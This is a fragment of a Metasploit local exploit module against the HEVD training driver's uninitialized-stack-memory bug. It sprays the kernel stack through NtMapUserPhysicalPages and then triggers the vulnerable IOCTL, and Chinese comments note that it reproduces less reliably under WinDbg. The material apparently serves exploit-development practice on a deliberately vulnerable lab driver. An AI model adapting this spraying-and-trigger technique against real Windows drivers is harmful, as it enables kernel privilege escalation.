...
#开着windbg调试时UninitializedMemory置为0，复现失败，关闭windbg时复现成功率更高
#运行失败
...
class MetasploitModule < Msf::Exploit::Local
	...
	def initialize(info={})
		super(update_info(info, {
			'Name'              => 'HEVD UninitializedMemoryStack',
	...
	def exploit
		...
		this_proc.memory.write(0x1100, "\x37\x13\xd3\xba")
		this_proc.memory.write(0x1200, "\x00\x10\x00\x00"*0x400) #1024=0x400
		
		
		session.railgun.add_function('ntdll', 'NtMapUserPhysicalPages', 'BOOL',[
			["LPVOID","VirtualAddress","in"],
			["DWORD","NumberOfPages","in"],
			["LPVOID","PageArray","in"]
		 ])

		session.railgun.ntdll.NtMapUserPhysicalPages(nil,1024,0x1200)
		
		print_status("Triggering the vulnerability...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22202f, 0x1100, 0x4, 0, 0)
